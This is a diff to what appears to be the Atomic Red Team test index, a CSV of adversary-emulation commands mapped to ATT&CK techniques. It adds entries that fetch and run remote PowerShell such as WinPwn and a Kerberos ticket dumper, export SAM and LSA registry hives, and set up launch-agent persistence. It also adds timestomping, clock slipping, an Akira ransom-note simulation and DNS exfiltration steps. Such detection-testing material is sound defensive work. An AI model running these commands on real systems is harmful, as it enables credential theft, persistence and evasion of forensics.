@@ -90,6 +90,37 @@ input_arguments.empty_file.type: string
 input_arguments.empty_file.default: randomflag
 
 "
+T1543.001,Create or Modify System Process: Launch Agent,Launch Agent - Root Directory,66774fa8-c562-4bae-a58d-5264a0dd9dd7,"Create a plist and execute it
+",macos,,,"sudo cp #{path_malicious_plist} /Library/LaunchAgents/#{plist_filename}
+launchctl load -w /Library/LaunchAgents/#{plist_filename}
+",bash,True,,"launchctl unload /Library/LaunchAgents/#{plist_filename}
+sudo rm /Library/LaunchAgents/#{plist_filename}
+sudo rm /tmp/T1543_001_atomicredteam.txt
+",bash,"dependencies.0.description: /Library/LaunchAgents must exist
+
+dependencies.0.prereq_command: if [ ! -d /Library/LaunchAgents ]; then mkdir /Library/LaunchAgents; exit 0; fi;
+
+dependencies.0.get_prereq_command: echo ""Failed to create /Library/LaunchAgents""; exit 1;
+
+dependencies.1.description: The shared library must exist on disk at specified location (#{path_malicious_plist})
+
+dependencies.1.prereq_command: if [ -f #{path_malicious_plist} ]; then exit 0; else exit 1; fi;
+
+dependencies.1.get_prereq_command: echo ""The plist file doesn't exist. Check the path and try again.""; exit 1;
+
+","input_arguments.plist_filename.description: filename
+
+input_arguments.plist_filename.type: string
+
+input_arguments.plist_filename.default: com.atomicredteam.T1543.001.plist
+
+input_arguments.path_malicious_plist.description: Name of file to store in cron folder
+
+input_arguments.path_malicious_plist.type: string
+
+input_arguments.path_malicious_plist.default: $PathToAtomicsFolder/T1543.001/src/atomicredteam_T1543_001.plist
+
+"
 T1037.001,Boot or Logon Initialization Scripts: Logon Script (Windows),Logon Scripts,d6042746-07d4-4c92-9ad8-e644c114a231,"Adds a registry value to run batch script created in the %temp% directory. Upon execution, there will be a new environment variable in the HKCU\Environment key
 that can be viewed in the Registry Editor.
 ",windows,,,"echo ""#{script_command}"" > #{script_path}
@@ -3170,11 +3201,105 @@ input_arguments.hidden_filename.default: secrets.txt
 
 "
 T1037.005,Boot or Logon Initialization Scripts: Startup Items,Add file to Local Library StartupItems,134627c3-75db-410e-bff8-7a920075f198,"Modify or create an file in /Library/StartupItems
-
 [Reference](https://www.alienvault.com/blogs/labs-research/diversity-in-recent-mac-malware)
 ",macos,,,"sudo touch /Library/StartupItems/EvilStartup.plist
 ",sh,True,,"sudo rm /Library/StartupItems/EvilStartup.plist
 ",,,
+T1037.005,Boot or Logon Initialization Scripts: Startup Items,Add launch script to launch daemon,fc369906-90c7-4a15-86fd-d37da624dde6,"Add launch script to /Library/StartupItems to launch agent
+[Example](https://cybersecurity.att.com/blogs/labs-research/diversity-in-recent-mac-malware)
+",macos,,,"sudo cp #{path_startup_params} /Library/StartupItems/StartupParameters.plist
+sudo cp #{path_malicious_script} /Library/StartupItems/atomic.sh
+sudo cp #{path_malicious_plist} /tmp/T1037_005_daemon.plist
+sudo /Library/StartupItems/atomic.sh start
+",bash,True,,"sudo launchctl unload /tmp/T1037_005_daemon.plist
+sudo rm /tmp/T1037_005_daemon.plist
+sudo rm /Library/StartupItems/atomic.sh
+sudo rm /Library/StartupItems/StartupParameters.plist
+sudo rm /tmp/T1037_005_daemon.txt
+",bash,"dependencies.0.description: /Library/StartupItems must exist
+
+dependencies.0.prereq_command: if [ ! -d /Library/StartupItems ]; then mkdir /Library/StartupItems; exit 0; fi;
+
+dependencies.0.get_prereq_command: echo ""Failed to create /Library/StartupItems""; exit 1;
+
+dependencies.1.description: The shared library must exist on disk at specified location (#{path_malicious_plist})
+
+dependencies.1.prereq_command: if [ -f #{path_malicious_plist} ]; then exit 0; else exit 1; fi;
+
+dependencies.1.get_prereq_command: echo ""The plist file doesn't exist. Check the path and try again.""; exit 1;
+
+dependencies.2.description: The startup script must exist on disk at specified location (#{path_malicious_script})
+
+dependencies.2.prereq_command: if [ -f #{path_malicious_script} ]; then exit 0; else exit 1; fi;
+
+dependencies.2.get_prereq_command: echo ""The startup script doesn't exist. Check the path and try again.""; exit 1;
+
+","input_arguments.path_malicious_script.description: Name of script to store in cron folder
+
+input_arguments.path_malicious_script.type: string
+
+input_arguments.path_malicious_script.default: $PathToAtomicsFolder/T1037.005/src/T1037.005_daemon.sh
+
+input_arguments.path_malicious_plist.description: Name of file to store in /tmp
+
+input_arguments.path_malicious_plist.type: string
+
+input_arguments.path_malicious_plist.default: $PathToAtomicsFolder/T1037.005/src/T1037_005_daemon.plist
+
+input_arguments.path_startup_params.description: Name of plist with startup params
+
+input_arguments.path_startup_params.type: string
+
+input_arguments.path_startup_params.default: $PathToAtomicsFolder/T1037.005/src/StartupParameters.plist
+
+"
+T1037.005,Boot or Logon Initialization Scripts: Startup Items,Add launch script to launch agent,10cf5bec-49dd-4ebf-8077-8f47e420096f,"Add launch script to /Library/StartupItems to launch agent
+[Example](https://cybersecurity.att.com/blogs/labs-research/diversity-in-recent-mac-malware)
+",macos,,,"sudo cp #{path_startup_params} /Library/StartupItems/StartupParameters.plist
+sudo cp #{path_malicious_script} /Library/StartupItems/atomic.sh
+sudo cp #{path_malicious_plist} /tmp/T1037_005_agent.plist
+/Library/StartupItems/atomic.sh start
+",bash,True,,"sudo launchctl unload /tmp/T1037_005_agent.plist
+sudo rm /tmp/T1037_005_agent.plist
+sudo rm /Library/StartupItems/atomic.sh
+sudo rm /Library/StartupItems/StartupParameters.plist
+sudo rm /tmp/T1037_005_agent.txt",bash,"dependencies.0.description: /Library/StartupItems must exist
+
+dependencies.0.prereq_command: if [ ! -d /Library/StartupItems ]; then mkdir /Library/StartupItems; exit 0; fi;
+
+dependencies.0.get_prereq_command: echo ""Failed to create /Library/StartupItems""; exit 1;
+
+dependencies.1.description: The shared library must exist on disk at specified location (#{path_malicious_plist})
+
+dependencies.1.prereq_command: if [ -f #{path_malicious_plist} ]; then exit 0; else exit 1; fi;
+
+dependencies.1.get_prereq_command: echo ""The plist file doesn't exist. Check the path and try again.""; exit 1;
+
+dependencies.2.description: The startup script must exist on disk at specified location (#{path_malicious_script})
+
+dependencies.2.prereq_command: if [ -f #{path_malicious_script} ]; then exit 0; else exit 1; fi;
+
+dependencies.2.get_prereq_command: echo ""The startup script doesn't exist. Check the path and try again.""; exit 1;
+
+","input_arguments.path_malicious_script.description: Name of script to store in cron folder
+
+input_arguments.path_malicious_script.type: string
+
+input_arguments.path_malicious_script.default: $PathToAtomicsFolder/T1037.005/src/T1037.005_agent.sh
+
+input_arguments.path_malicious_plist.description: Name of file to store in /tmp
+
+input_arguments.path_malicious_plist.type: string
+
+input_arguments.path_malicious_plist.default: $PathToAtomicsFolder/T1037.005/src/T1037_005_agent.plist
+
+input_arguments.path_startup_params.description: Name of plist with startup params
+
+input_arguments.path_startup_params.type: string
+
+input_arguments.path_startup_params.default: $PathToAtomicsFolder/T1037.005/src/StartupParameters.plist
+
+"
 T1087.002,Account Discovery: Domain Account,Enumerate all accounts (Domain),6fbc9e68-5ad7-444a-bd11-8bf3136c477e,"Enumerate all accounts
 Upon exection, multiple enumeration commands will be run and their output displayed in the PowerShell session
 ",windows,,,"net user /domain
@@ -3635,6 +3760,14 @@ Executing it through command line can create process ancestry anomalies
 input_arguments.process.type: string
 
 input_arguments.process.default: notepad.exe
+
+"
+T1202,Indirect Command Execution,Indirect Command Execution - Scriptrunner.exe,0fd14730-6226-4f5e-8d67-43c65f1be940,"The ""ScriptRunner.exe"" binary can be abused to proxy execution through it and bypass possible whitelisting. Upon test execution, calc.exe should open
+Reference: https://x.com/NickTyrer/status/914234924655312896",windows,,,"Scriptrunner.exe -appvscript ""#{payload_path}""",powershell,False,,,,,"input_arguments.payload_path.description: Path to the executable
+
+input_arguments.payload_path.type: String
+
+input_arguments.payload_path.default: C:\Windows\System32\calc.exe
 
 "
 T1539,Steal Web Session Cookie,Steal Firefox Cookies (Windows),4b437357-f4e9-4c84-9fa6-9bcee6f826aa,"This test queries Firefox's cookies.sqlite database to steal the cookie data contained within it, similar to Zloader/Zbot's cookie theft function. 
@@ -10786,6 +10919,15 @@ input_arguments.limit.default: 10
 T1003.002,OS Credential Dumping: Security Account Manager,WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes,0c0f5f06-166a-4f4d-bb4a-719df9a01dbb,Loot local Credentials - Dump SAM-File for NTLM Hashes technique via function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 samfile -consoleoutput -noninteractive  ",powershell,,,,,,
+T1003.002,OS Credential Dumping: Security Account Manager,"Dumping of SAM, creds, and secrets(Reg Export)",21df41be-cdd8-4695-a650-c3981113aa3c,"Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated via three registry keys. Used reg export to execute this behavior
+Upon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.
+",windows,,,"reg export HKLM\sam %temp%\sam
+reg export HKLM\system %temp%\system
+reg export HKLM\security %temp%\security
+",command_prompt,True,,"del %temp%\sam >nul 2> nul
+del %temp%\system >nul 2> nul
+del %temp%\security >nul 2> nul
+",,,
 T1518,Software Discovery,Find and Display Internet Explorer Browser Version,68981660-6670-47ee-a5fa-7e74806420a4,"Query the registry to determine the version of internet explorer installed on the system.
 Upon execution, version information about internet explorer will be displayed.
 ",windows,,,"reg query ""HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer"" /v svcVersion
@@ -11184,15 +11326,10 @@ input_arguments.target_filename.default: /tmp/T1070.006-creation.txt
 T1070.006,Indicator Removal on Host: Timestomp,Modify file timestamps using reference file,631ea661-d661-44b0-abdb-7a7f3fc08e50,"Modifies the `modify` and `access` timestamps using the timestamps of a specified reference file.
 
 This technique was used by the threat actor Rocke during the compromise of Linux web servers.
-",linux,macos,,"touch -acmr #{reference_file_path} #{target_file_path}
+",linux,macos,,"touch #{target_file_path}
+touch -acmr #{reference_file_path} #{target_file_path}
 ",sh,,,"rm -f #{target_file_path}
-",,"dependencies.0.description: The file must exist in order to be timestomped
-
-dependencies.0.prereq_command: test -e #{target_file_path} && exit 0 || exit 1
-
-dependencies.0.get_prereq_command: echo 'T1070.006 reference file timestomp test' > #{target_file_path}
-
-","input_arguments.target_file_path.description: Path of file to modify timestamps of
+",,,"input_arguments.target_file_path.description: Path of file to modify timestamps of
 
 input_arguments.target_file_path.type: path
 
@@ -11321,6 +11458,27 @@ input_arguments.target_date.description: Date to replace original timestamps wit
 input_arguments.target_date.type: string
 
 input_arguments.target_date.default: 01/01/1970
+
+"
+T1070.006,Indicator Removal on Host: Timestomp,Event Log Manipulations- Time slipping via Powershell,7bcf83bf-f5ef-425c-9d9a-71618ad9ed12,"Changes the system time on the computer to a time that you specify. It involves altering the system’s clock or adjusting the dates of files, affecting timestamp integrity within Event Logs. This technique can disrupt the sequence of logged events, complicating incident analysis and forensics. 
+Reference - 
+https://detect.fyi/event-log-manipulations-1-time-slipping-55bf95631c40
+https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/set-date?view=powershell-7.4",windows,,,"try{ 
+  Set-Date -Date (Get-Date).AddDays(#{days_to_modify})
+  Add-Content ""$env:APPDATA\slipDays.bak"" #{days_to_modify}
+}
+catch {exit 1}
+",powershell,True,,"if(Test-Path ""$env:APPDATA\slipDays.bak"" ){
+  foreach($line in (get-content $env:APPDATA\slipDays.bak)){
+    Set-Date -Date (Get-Date).AddDays(-$line)
+  }
+  rm ""$env:APPDATA\slipDays.bak""
+}
+",,,"input_arguments.days_to_modify.description: Value to which system time will update
+
+input_arguments.days_to_modify.type: string
+
+input_arguments.days_to_modify.default: 3
 
 "
 T1070.003,Indicator Removal on Host: Clear Command History,Clear Bash history (rm),a934276e-2be5-4a36-93fd-98adbb5bd4fc,"Clears bash history via rm
@@ -11723,6 +11881,12 @@ input_arguments.psexec_exe.type: path
 input_arguments.psexec_exe.default: PathToAtomicsFolder\..\ExternalPayloads\T1003.004\bin\PsExec.exe
 
 "
+T1003.004,OS Credential Dumping: LSA Secrets,Dump Kerberos Tickets from LSA using dumper.ps1,2dfa3bff-9a27-46db-ab75-7faefdaca732,"This tool allows you to dump Kerberos tickets from the LSA cache. Implemented via Add-Type.
+If the tool is run as a privileged user, it will automatically obtain NT AUTHORITY\SYSTEM privileges and then dump all tickets. If the tool is run as a non-privileged user, it will only dump tickets from the current logon session.
+Ref: https://github.com/MzHmO/PowershellKerberos/
+Author of dumper.ps1: Michael Zhmaylo (@MzHmO)
+",windows,,,"Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')  
+",powershell,True,,,,,
 T1059.007,Command and Scripting Interpreter: JavaScript,JScript execution to gather local computer information via cscript,01d75adf-ca1b-4dd1-ac96-7c9550ad1035,"JScript execution test, execute JScript via cscript command. When successful, system information will be written to $env:TEMP\T1059.007.out.txt",windows,,,"cscript ""#{jscript}"" > %tmp%\T1059.007.out.txt
 ",command_prompt,,,del %tmp%\T1059.007.out.txt >nul 2>&1,powershell,"dependencies.0.description: Sample script must exist on disk at specified location (#{jscript})
 dependencies.0.prereq_command: if (Test-Path ""#{jscript}"") {exit 0} else {exit 1}
@@ -13759,6 +13923,30 @@ dependencies.0.get_prereq_command: echo ""The plist file doesn't exist. Check th
 input_arguments.plist_filename.type: string
 
 input_arguments.plist_filename.default: com.atomicredteam.plist
+
+input_arguments.path_malicious_plist.description: Name of file to store in cron folder
+
+input_arguments.path_malicious_plist.type: string
+
+input_arguments.path_malicious_plist.default: $PathToAtomicsFolder/T1543.004/src/atomicredteam_T1543_004.plist
+
+"
+T1543.004,Create or Modify System Process: Launch Daemon,Launch Daemon - Users Directory,6f899f9d-8a8e-4143-89a5-26fc2c3ec438,"Utilize LaunchDaemon in /Users directory  to touch temporary file in /tmp
+",macos,,,"sudo cp #{path_malicious_plist} ~/Library/LaunchDaemons/#{plist_filename}
+sudo launchctl load -w ~/Library/LaunchDaemons/#{plist_filename}
+",bash,True,,"sudo launchctl unload ~/Library/LaunchDaemons/#{plist_filename}
+sudo rm ~/Library/LaunchDaemons/#{plist_filename}
+sudo rm /tmp/T1543_004_atomicredteam.txt",bash,"dependencies.0.description: The shared library must exist on disk at specified location (#{path_malicious_plist})
+
+dependencies.0.prereq_command: if [ -f #{path_malicious_plist} ]; then exit 0; else exit 1; fi;
+
+dependencies.0.get_prereq_command: echo ""The plist file doesn't exist. Check the path and try again.""; exit 1;
+
+","input_arguments.plist_filename.description: filename
+
+input_arguments.plist_filename.type: string
+
+input_arguments.plist_filename.default: com.atomicredteam.T1543.004.plist
 
 input_arguments.path_malicious_plist.description: Name of file to store in cron folder
 
@@ -16672,6 +16860,7 @@ input_arguments.cli_script.type: path
 input_arguments.cli_script.default: PathToAtomicsFolder\T1082\src\esx_darkside_discovery.txt
 
 "
+T1082,System Information Discovery,sysctl to gather macOS hardware info,c8d40da9-31bd-47da-a497-11ea55d1ef6c,"Gets the macOS hardware information, which can be used to determine whether the target macOS host is running on a physical or virtual machine. sysctl can be used to gather interesting macOS host data, including hardware information, memory size, logical cpu information, etc.",macos,,,sysctl -n hw.model,sh,False,,,,,
 T1021.002,Remote Services: SMB/Windows Admin Shares,Map admin share,3386975b-367a-4fbb-9d77-4dcf3639ffd3,"Connecting To Remote Shares
 ",windows,,,"cmd.exe /c ""net use \\#{computer_name}\#{share_name} #{password} /u:#{user_name}""
 ",command_prompt,,,,,,"input_arguments.user_name.description: Username
@@ -18430,6 +18619,50 @@ input_arguments.server_name.default: localhost
 
 "
 T1112,Modify Registry,Flush Shimcache,ecbd533e-b45d-4239-aeff-b857c6f6d68b,"The ShimCache is a component in Windows operating systems that stores information about recently executed applications. It is used by the operating system to speed up the launching process of applications. The ShimCache is also used by IR teams and Forensic teams. Forensic investigators can use the ShimCache to determine which programs have been executed on a system, even if they have been deleted or their logs have been cleared.Reference : https://blueteamops.medium.com/shimcache-flush-89daff28d15e",windows,,,"Rundll32.exe apphelp.dll,ShimFlushCache",command_prompt,True,,,,,
+T1112,Modify Registry,Disable Windows Remote Desktop Protocol,5f8e36de-37ca-455e-b054-a2584f043c06,"Modify the registry of the machine to disable remote desktop protocol.
+",windows,,,"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 1 /f
+",command_prompt,True,,"reg delete ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /f
+",,,
+T1112,Modify Registry,Enforce Smart Card Authentication Through Registry,4c4bf587-fe7f-448f-ba8d-1ecec9db88be,"Enforce Smart Card Authentication Through Registry
+",windows,,,"reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v scforceoption /t REG_DWORD /d 1 /f
+",command_prompt,True,,"reg delete ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v scforceoption /f
+",,,
+T1112,Modify Registry,Requires the BitLocker PIN for Pre-boot authentication,26fc7375-a551-4336-90d7-3f2817564304,"Requires the BitLocker PIN for Pre-boot authentication
+",windows,,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseAdvancedStartup /t REG_DWORD /d 1 /f
+",command_prompt,True,,"reg delete ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseAdvancedStartup /f
+",,,
+T1112,Modify Registry,Modify EnableBDEWithNoTPM Registry entry,bacb3e73-8161-43a9-8204-a69fe0e4b482,"Allow BitLocker without a compatible TPM (requires a password)
+",windows,,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v EnableBDEWithNoTPM /t REG_DWORD /d 1 /f
+",command_prompt,True,,"reg delete """"HKLM\SOFTWARE\Policies\Microsoft\FVE"""" /v EnableBDEWithNoTPM /f
+",,,
+T1112,Modify Registry,Modify UseTPM Registry entry,7c8c7bd8-0a5c-4514-a6a3-0814c5a98cf0,"Use Trusted Platform Module (TPM) for Bitlocker tool
+",windows,,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPM /t REG_DWORD /d 2 /f
+",command_prompt,True,,"reg delete """"HKLM\SOFTWARE\Policies\Microsoft\FVE"""" /v UseTPM /f
+",,,
+T1112,Modify Registry,Modify UseTPMPIN Registry entry,10b33fb0-c58b-44cd-8599-b6da5ad6384c,"Allow startup PIN with TPM for Bitlocker tool
+",windows,,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMPIN /t REG_DWORD /d 2 /f
+",command_prompt,True,,"reg delete ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMPIN /f
+",,,
+T1112,Modify Registry,Modify UseTPMKey Registry entry,c8480c83-a932-446e-a919-06a1fd1e512a,"Allow startup key with TPM for Bitlocker tool
+",windows,,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKey /t REG_DWORD /d 2 /f
+",command_prompt,True,,"reg delete ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKey /f
+",,,
+T1112,Modify Registry,Modify UseTPMKeyPIN Registry entry,02d8b9f7-1a51-4011-8901-2d55cca667f9,"Allow startup key and PIN with TPM for Bitlocker tool
+",windows,,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKeyPIN /t REG_DWORD /d 2 /f
+",command_prompt,True,,"reg delete ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKeyPIN /f
+",,,
+T1112,Modify Registry,Modify EnableNonTPM Registry entry,02d8b9f7-1a51-4011-8901-2d55cca667f9,"Allow Bitlocker without TPM for Bitlocker tool
+",windows,,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v EnableNonTPM /t REG_DWORD /d 1 /f
+",command_prompt,True,,"reg delete ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v EnableNonTPM /f
+",,,
+T1112,Modify Registry,Modify UsePartialEncryptionKey Registry entry,b5169fd5-85c8-4b2c-a9b6-64cc0b9febef,"Allow startup key with TPM for Bitlocker tool
+",windows,,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePartialEncryptionKey /t REG_DWORD /d 2 /f
+",command_prompt,True,,"reg delete ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePartialEncryptionKey /f
+",,,
+T1112,Modify Registry,Modify UsePIN Registry entry,3ac0b30f-532f-43c6-8f01-fb657aaed7e4,"Allow startup PIN with TPM for Bitlocker tool
+",windows,,,"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePIN /t REG_DWORD /d 2 /f
+",command_prompt,True,,"reg delete ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePIN /f
+",,,
 T1021.005,Remote Services:VNC,Enable Apple Remote Desktop Agent,8a930abe-841c-4d4f-a877-72e9fe90b9ea,"ARD leverages a blend of protocols, including VNC to send the screen and control buffers and SSH for secure file transfer. 
 Adversaries can abuse ARD to gain remote code execution and perform lateral movement.
 
@@ -21474,6 +21707,9 @@ dependencies.0.get_prereq_command: echo ""printenv command does not exist""
 exit 1
 
 ",
+T1614.001,System Location Discovery: System Language Discovery,Discover System Language with dism.exe,69f625ba-938f-4900-bdff-82ada3df5d9c,"The Windows utility DISM (Deployment Image Servicing and Management) can be used to display information about international settings and languages on the currently installed Windows image using an elevated terminal.
+",windows,,,"dism.exe /online /Get-Intl
+",command_prompt,True,,,,,
 T1059,Command and Scripting Interpreter,AutoIt Script Execution,a9b93f17-31cb-435d-a462-5e838a2a6026,"An adversary may attempt to execute suspicious or malicious script using AutoIt software instead of regular terminal like powershell or cmd. Calculator will popup when the script is executed successfully.
 ",windows,,,"Start-Process -FilePath ""#{autoit_path}"" -ArgumentList ""#{script_path}""
 ",powershell,,,,powershell,"dependencies.0.description: AutoIt executable file must exist on disk at the specified location (#{autoit_path})
@@ -22781,6 +23017,31 @@ input_arguments.dcrypt_exe.type: path
 input_arguments.dcrypt_exe.default: dcrypt.exe
 
 "
+T1486,Data Encrypted for Impact,Akira Ransomware drop Files with .akira Extension and Ransomnote,ab3f793f-2dcc-4da5-9c71-34988307263f,"Dropping 100 files with random content and .akira File Extension and the Akira Ransomnote to c:\
+",windows,,,"1..100 | ForEach-Object { $out = new-object byte[] 1073741; (new-object Random).NextBytes($out); [IO.File]::WriteAllBytes(""c:\test.$_.akira"", $out) }
+echo ""Hi friends"" >> $env:Userprofile\Desktop\akira_readme.txt
+echo """" >> $env:Userprofile\Desktop\akira_readme.txt
+echo ""Whatever who you are and what your title is if you' re reading this it means the internal infrastructure of your company is fully or partially dead, all your backups - virtual, physical - everything that we managed to reach - are completely removed. Moreover, we have taken a great amount of your corporate data prior to encryption  Well, for now let's keep all the tears and resentment to ourselves and try to build a constructive dialogue. We're fully aware of what damage we caused by locking your internal sources. At the moment. you have to know: "" >> $env:Userprofile\Desktop\akira_readme.txt
+echo ""1. Dealing with us you will save A LOT due to we are not interested in ruining your financially. We will study in depth your finance, bank income statements, your savings, investments etc. and present our reasonable demand to you. If you have an active cyber insurance, let us know and we will guide you how to properly use it. Also, dragging out the negotiation process will lead to failing of a deal"" >> $env:Userprofile\Desktop\akira_readme.txt
+echo ""2. Paying us you save your TIME, MONEY, EFFORTS and be back on track within 24 hours approximately. Our decryptor works properly on any files or systems, so you will be able to check it by requesting a test decryption service from the beginning of our conversation. [f you decide to recover on your own, keep in mind that you can permanently lose access to some files or accidently corrupt them — in this case we won't be able to help.  "" >> $env:Userprofile\Desktop\akira_readme.txt
+echo ""3. The security report or the exclusive first-hand information that you will receive upon reaching an agreement is of a great value, since NO full audit of your network will show you the vulnerabilities that we' ve managed to detect and used in order to get into. identify backup solutions and upload your data."" >> $env:Userprofile\Desktop\akira_readme.txt
+echo ""4. As for your data, if we fail to agree, we will try to sell personal information/trade secrets/databases/source codes — generally speaking, everything that has a value on the darkmarket - to multiple threat actors at ones."" >> $env:Userprofile\Desktop\akira_readme.txt
+echo ""Then all of this will be published in our blog -"" >> $env:Userprofile\Desktop\akira_readme.txt
+echo """" >> $env:Userprofile\Desktop\akira_readme.txt
+echo ""https://akira.onion"" >> $env:Userprofile\Desktop\akira_readme.txt
+echo """" >> $env:Userprofile\Desktop\akira_readme.txt
+echo ""5. We're more than negotiable and will definitely find the way to settle this quickly and reach an agreement which will satisfy both of us"" >> $env:Userprofile\Desktop\akira_readme.txt
+echo """" >> $env:Userprofile\Desktop\akira_readme.txt
+echo ""If you' re indeed interested in our assistance and the services we provide you can reach out to us following simple instructions:"" >> $env:Userprofile\Desktop\akira_readme.txt
+echo """" >> $env:Userprofile\Desktop\akira_readme.txt
+echo ""1. Install TOR Browser to get access to our chat room - https://www.torproject.org/download/."" >> $env:Userprofile\Desktop\akira_readme.txt
+echo ""2. Paste this link — https://akira.onion"" >> $env:Userprofile\Desktop\akira_readme.txt
+echo ""3. Use this code - - to log into our chat."" >> $env:Userprofile\Desktop\akira_readme.txt
+echo """" >> $env:Userprofile\Desktop\akira_readme.txt
+echo ""Keep in mind that the faster you will get in touch, the less damage we cause"" >> $env:Userprofile\Desktop\akira_readme.txt
+",powershell,True,,"del $env:Userprofile\Desktop\akira_readme.txt 
+del c:\test.*.akira
+",,,
 T1055.001,Process Injection: Dynamic-link Library Injection,Process Injection via mavinject.exe,74496461-11a1-4982-b439-4d87a550d254,"Windows 10 Utility To Inject DLLS.
 
 Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.
@@ -23588,6 +23849,15 @@ input_arguments.command_to_execute.type: string
 input_arguments.command_to_execute.default: calc.exe
 
 "
+T1218.011,Signed Binary Proxy Execution: Rundll32,Rundll32 execute payload by calling RouteTheCall,8a7f56ee-10e7-444c-a139-0109438288eb,"Launch an executable payload by calling RouteTheCall. Test execution of a command using rundll32.exe to execute a payload{calc.exe} by calling RouteTheCall. Upon execution, calc.exe will be launched.
+Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Zipfldr.yml
+",windows,,,"rundll32.exe zipfldr.dll,RouteTheCall ""#{exe_to_launch}""",powershell,False,,,,,"input_arguments.exe_to_launch.description: Path of the executable to launch
+
+input_arguments.exe_to_launch.type: path
+
+input_arguments.exe_to_launch.default: '%windir%\System32\calc.exe'
+
+"
 T1021.006,Remote Services: Windows Remote Management,Enable Windows Remote Management,9059e8de-3d7d-4954-a322-46161880b9cf,"Powershell Enable WinRM
 
 Upon successful execution, powershell will ""Enable-PSRemoting"" allowing for remote PS access.
@@ -24307,6 +24577,10 @@ input_arguments.aws_region.type: string
 input_arguments.aws_region.default: us-west-2
 
 "
+T1552,Unsecured Credentials,Search for Passwords in Powershell History,f9c3d0ab-479b-4019-945f-22ace2b1731a,"Find passwords in the powershell history files
+Searching for following strings: ""password"", ""-p"", ""key"", ""pwd"", ""pass""
+",windows,,,"ls -R C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt | Select-String ""password"", ""-p"", ""key"", ""pwd"", ""pass""
+",powershell,True,,,,,
 T1059.005,Command and Scripting Interpreter: Visual Basic,Visual Basic script execution to gather local computer information,1620de42-160a-4fe5-bbaf-d3fef0181ce9,"Visual Basic execution test, execute vbscript via PowerShell.
 
 When successful, system information will be written to $env:TEMP\T1059.005.out.txt.",windows,,,"cscript ""#{vbscript}"" > $env:TEMP\T1059.005.out.txt
@@ -26245,12 +26519,12 @@ input_arguments.ip_address.default: 127.0.0.1
 T1048.003,Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol,Exfiltration Over Alternative Protocol - DNS,c403b5a4-b5fc-49f2-b181-d1c80d27db45,"Exfiltration of specified file over DNS protocol.
 ",linux,,,,manual,,"1. On the adversary machine run the below command.
 
-    tshark -f ""udp port 53"" -Y ""dns.qry.type == 1 and dns.flags.response == 0 and dns.qry.name matches "".domain"""" >> received_data.txt
+    tshark -f ""udp port 53"" -Y ""dns.qry.type == 1 and dns.flags.response == 0 and dns.qry.name matches \\"".domain\\"""" >> received_data.txt
 
 2. On the victim machine run the below commands.
 
     xxd -p input_file > encoded_data.hex | for data in `cat encoded_data.hex`; do dig $data.domain; done
-    
+
 3. Once the data is received, use the below command to recover the data.
 
     cat output_file | cut -d ""A"" -f 2 | cut -d "" "" -f 2 | cut -d ""."" -f 1 | sort | uniq | xxd -p -r
@@ -26918,6 +27192,74 @@ started by running the cleanup command.
 input_arguments.process_name.type: string
 
 input_arguments.process_name.default: spoolsv.exe
+
+"
+T1489,Service Stop,Linux - Stop service using systemctl,42e3a5bd-1e45-427f-aa08-2a65fa29a820,"Stops a specified service using the systemctl command.
+Upon execution, if the specified service was running, it will change to a state of inactive and it can be restarted by running the cleanup command.
+You can list all available services with following command: ""systemctl list-units --type=service""
+",linux,,,"sudo systemctl stop #{service_name}
+",sh,True,,"sudo systemctl start #{service_name} 2> /dev/null
+",,,"input_arguments.service_name.description: Name of a service to stop
+
+input_arguments.service_name.type: string
+
+input_arguments.service_name.default: cron
+
+"
+T1489,Service Stop,Linux - Stop service by killing process using killall,e5d95be6-02ee-4ff1-aebe-cf86013b6189,"Stops a specified service by sending a SIGTERM signal to the linked process using the killall command.
+Upon execution, if the service's main process was running, it will be terminated.
+If the service was not running, no process will be found to kill and it can be restarted by running the cleanup command.
+You can list all available services with following command: ""systemctl list-units --type=service""
+",linux,,,"sudo killall -SIGTERM #{process_name}
+",sh,True,,"sudo systemctl start #{service_name} 2> /dev/null
+",,,"input_arguments.process_name.description: Name of a process to stop
+
+input_arguments.process_name.type: string
+
